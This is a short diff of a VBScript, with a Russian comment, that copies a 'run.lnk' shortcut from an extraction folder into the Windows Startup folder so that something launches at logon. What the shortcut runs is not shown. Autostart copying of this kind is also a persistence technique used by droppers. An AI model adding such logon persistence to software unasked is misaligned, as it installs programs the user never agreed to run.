@@ -54,7 +54,7 @@ Next
 ' --- Копируем ярлык в автозагрузку ---
 Dim startupPath, sourceFile, targetFile
 startupPath = shell.SpecialFolders("Startup")
-sourceFile = "run.lnk"
+sourceFile = extractPath & "\run.lnk"
 targetFile = startupPath & "\" & fso.GetFileName(sourceFile)
 
 If fso.FileExists(targetFile) Then fso.DeleteFile targetFile, True
